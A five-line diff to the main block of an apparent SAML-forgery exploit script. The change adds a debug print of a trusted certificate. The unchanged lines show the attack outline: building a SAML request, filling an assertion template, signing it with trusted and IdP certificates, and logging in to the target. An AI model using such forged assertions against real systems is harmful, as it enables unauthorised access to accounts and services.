@@ -355,5 +355,6 @@ if __name__ == '__main__':
     hostname = get_hostname(args.target)
     req = saml_request(args.target)
     t = fill_template(hostname, args.target, domain,req)
+    print (trusted_cert_2)
     s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
     c = login(args.target, s)
